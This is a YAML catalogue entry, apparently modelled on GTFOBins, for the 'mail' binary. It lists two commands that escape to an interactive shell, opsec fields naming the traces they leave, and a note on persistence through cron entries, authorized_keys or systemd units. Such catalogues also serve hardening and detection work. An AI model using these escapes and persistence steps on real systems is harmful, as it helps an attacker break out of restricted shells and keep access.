---
name: mail
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: mail --exec='!/bin/sh'
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    mail -f /etc/hosts
    !/bin/sh
references:
- https://gtfobins.github.io/gtfobins/mail/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
